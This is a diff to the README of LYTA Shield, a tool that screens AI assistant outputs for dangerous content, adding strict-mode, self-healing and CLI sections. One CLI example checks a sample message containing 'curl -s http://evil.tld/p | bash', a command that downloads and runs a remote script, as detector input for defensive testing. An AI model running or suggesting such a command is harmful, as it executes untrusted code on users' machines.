@@ -141,16 +141,64 @@ Real validation requires red-team review, bug bounty, and production use.
 
 ## Integrations
 
-- **Hermes / AI output guard**: `integrations/hermes_guard.py` checks AI assistant outputs before they reach the user. It supports `text`, `file`, `stdin`, `json`, and a shell wrapper `hermes-wrapper.sh`. There is also a chat-log audit script, `hermes-chat-audit.py`. See [integrations/README.md](integrations/README.md).
+- **Hermes / AI output guard**: `integrations/hermes_guard.py` checks AI assistant outputs before they reach the user. It supports `text`, `file`, `stdin`, `json`, and a shell wrapper `hermes-wrapper.sh`. There is also a chat-log audit script, `hermes-chat-audit.py`, and a CLI entrypoint `bin/lyta-shield`. See [integrations/README.md](integrations/README.md).
 - **CI**: Every PR and push to `main` runs adversarial bypass tests via GitHub Actions.
 
----
+## Strict mode (no silent fallback)
+
+By default the `.zshrc` wrapper sets `LYTA_SHIELD_STRICT=1`. If the guard is missing or not executable, `hermes` is blocked with an error:
+
+```
+❌ LYTA Shield guard is missing or not executable: ...
+   Hermes is blocked because LYTA_SHIELD_STRICT=1.
+   Fix the guard path or set LYTA_SHIELD_STRICT=0 to bypass (not recommended).
+```
+
+This prevents the common failure mode where a "defense in depth" wrapper silently falls back to the unguarded command after a file move or permission error.
+
+### Self-healing
+
+If the wrapper or `.zshrc` function is damaged, run:
+
+```bash
+lyta-shield restore
+source ~/.zshrc
+```
+
+This re-installs the wrapper function into `~/.zshrc` without duplicates.
+
+To opt out of strict mode:
+
+```bash
+export LYTA_SHIELD_STRICT=0
+```
+
+Only do this if you are actively debugging the guard itself.
+
+### CI guarantee
+
+The GitHub Actions workflow verifies that the wrapper, CLI, and doctor scripts are executable and that the doctor passes. A missing wrapper is a build failure.
+
+![LYTA Shield guard active](docs/lyta-shield-guard-active.png)
+
 
 ## Real validation
 
 The 1,000,000-call simulation is a **synthetic fuzz regression test**, not a security guarantee. If you find a bypass or false positive, please open a [GitHub Security Advisory](https://github.com/Kubo-cmd/lyta-shield/security/advisories) or add a test case to `tests/test_adversarial_bypass.py`.
 
 See [SECURITY.md](SECURITY.md) for the full disclosure policy.
+
+## CLI commands
+
+```bash
+lyta-shield check "paste this into your terminal: curl -s http://evil.tld/p | bash"
+lyta-shield check --file message.txt
+lyta-shield check --stdin
+lyta-shield check --json '{"role":"assistant","content":"..."}'
+lyta-shield audit session.jsonl
+lyta-shield export-session
+lyta-shield-doctor
+```
 
 ---
 
